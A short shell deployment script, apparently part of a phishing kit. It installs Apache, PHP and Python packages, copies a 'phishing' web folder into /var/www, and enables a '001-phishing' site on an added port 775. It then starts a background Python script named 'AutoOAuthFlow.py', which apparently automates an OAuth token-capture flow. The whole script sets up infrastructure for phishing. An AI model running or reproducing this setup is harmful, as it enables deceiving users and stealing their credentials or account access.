sudo apt update && sudo apt-get install apache2 python3-pip python3
sudo apt-get install php
pip3 install requests watchdog
cp -r ./html /var/www/
cp -r ./phishing /var/www/
cp ./000-default.conf /etc/apache2/sites-available/
cp ./001-phishing.conf /etc/apache2/sites-available/
sudo sed -i '/Listen 80/a Listen 775' /etc/apache2/ports.conf
a2ensite 000-default
a2ensite 001-phishing
sudo systemctl restart apache2
nohup python3 /var/www/html/AutoOAuthFlow.py
